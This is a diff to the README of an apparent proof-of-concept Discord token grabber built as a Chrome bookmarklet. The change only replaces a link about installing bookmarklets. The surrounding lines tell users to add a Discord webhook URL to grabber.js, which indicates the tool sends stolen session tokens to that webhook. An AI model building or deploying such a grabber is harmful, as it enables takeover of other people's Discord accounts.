@@ -11,4 +11,4 @@ A POC Discord token grabber in the form of a Chrome bookmark.
 
 #### :coffee: Installation & Usage
 1. Add your Discord webhook URL in `grabber.js`.
-2. Read [here](https://support.mozilla.org/en-US/kb/bookmarklets-perform-common-web-page-tasks) on how to use and install Chrome bookmarklets.
+2. Read [here](https://www.freecodecamp.org/news/what-are-bookmarklets/) on how to use and install Chrome bookmarklets.
